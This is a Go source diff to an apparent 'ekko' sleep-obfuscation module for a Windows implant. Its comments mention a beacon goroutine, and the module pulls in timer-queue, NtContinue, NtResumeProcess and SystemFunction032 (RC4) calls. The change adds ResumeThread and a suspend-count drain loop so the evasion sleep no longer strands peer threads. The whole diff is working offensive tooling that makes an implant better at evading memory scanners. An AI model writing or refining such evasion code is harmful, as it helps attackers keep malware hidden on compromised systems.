@@ -62,6 +62,12 @@ const (
 
 	// NtQueryInformationThread information classes.
 	threadQuerySetWin32StartAddress uintptr = 0x9
+	// ThreadSuspendCount: how many ResumeThread calls the thread still
+	// needs to run (0 = running).
+	threadSuspendCount = 0x23
+
+	// Bounded drain iterations per peer in drainResidualSuspends.
+	maxResumeDrain = 8
 
 	// Run every callback on the timer-queue thread itself, serially. All
 	// chain contexts share an Rsp derived from one capture taken on that
@@ -103,6 +109,7 @@ var (
 	procDeleteTimerQueueEx    = kernel32.NewProc("DeleteTimerQueueEx")
 	procRtlCaptureContext     = kernel32.NewProc("RtlCaptureContext")
 	procSuspendThread         = kernel32.NewProc("SuspendThread")
+	procResumeThread          = kernel32.NewProc("ResumeThread")
 
 	ntdll                        = syscall.NewLazyDLL("ntdll.dll")
 	procNtContinue               = ntdll.NewProc("NtContinue")
@@ -129,7 +136,7 @@ func init() {
 		procGetModuleHandleA, procVirtualAlloc, procVirtualFree,
 		procVirtualProtect, procCreateEventW, procSetEvent,
 		procCreateTimerQueue, procCreateTimerQueueTimer, procDeleteTimerQueueEx,
-		procRtlCaptureContext, procSuspendThread,
+		procRtlCaptureContext, procSuspendThread, procResumeThread,
 		procNtContinue, procNtDelayExecution, procNtResumeProcess,
 		procNtQueryInformationThread, procSystemFunction032,
 	} {
@@ -385,9 +392,11 @@ func Sleep(sleepMs uint64) error {
 			due, 0, wtExecuteInTimerThread,
 		)
 		if ret == 0 {
-			// The first timer is still 100ms out, so no step has run —
-			// but resume anyway in case arming somehow straddled it.
+			// The first timer is still one spacing out, so no step has
+			// run — but resume anyway in case arming somehow straddled
+			// it.
 			procNtResumeProcess.Call(uintptr(windows.CurrentProcess()))
+			drainResidualSuspends(peers)
 			return errors.New("ekko: CreateTimerQueueTimer failed")
 		}
 	}
@@ -401,15 +410,48 @@ func Sleep(sleepMs uint64) error {
 		totalWait = 0x7FFFFFFF
 	}
 	event, _ := windows.WaitForSingleObject(windows.Handle(hEvent), uint32(totalWait))
+	if event != windows.WAIT_OBJECT_0 {
+		// Timeout: the chain stalled after arming. Force-resume every
+		// thread with one call — see the doc comment for why this is
+		// always safe from here.
+		procNtResumeProcess.Call(uintptr(windows.CurrentProcess()))
+	}
+	drainResidualSuspends(peers)
 	if event == windows.WAIT_OBJECT_0 {
 		return nil
 	}
-
-	// Timeout: the chain stalled after arming. Force-resume every thread
-	// with one call — see the doc comment for why this is always safe
-	// from here.
-	procNtResumeProcess.Call(uintptr(windows.CurrentProcess()))
 	return ErrChainTimeout
+}
+
+// drainResidualSuspends resumes any peer still suspended after the
+// chain's NtResumeProcess. One NtResumeProcess decrements every thread
+// exactly once, so a peer that picked up a second suspend count during
+// the span (e.g. Go's async preemption suspending it mid-sleep) would
+// otherwise stay suspended for good: the beacon goroutine keeps running
+// from its excluded thread while every other thread is frozen. By the
+// time this runs, any transient preemptM pair has settled, so a
+// positive count is ours to clear. Count-driven and bounded — no
+// unconditional drain.
+func drainResidualSuspends(peers []windows.Handle) {
+	for _, h := range peers {
+		for i := 0; i < maxResumeDrain; i++ {
+			var count uint32
+			var retLen uintptr
+			status, _, _ := procNtQueryInformationThread.Call(
+				uintptr(h),
+				threadSuspendCount,
+				uintptr(unsafe.Pointer(&count)),
+				unsafe.Sizeof(count),
+				uintptr(unsafe.Pointer(&retLen)),
+			)
+			if status != 0 || count == 0 {
+				break
+			}
+			if r, _, _ := procResumeThread.Call(uintptr(h)); r == ^uintptr(0) {
+				break // thread is gone
+			}
+		}
+	}
 }
 
 // captureBaseContext queues an immediate RtlCaptureContext callback to
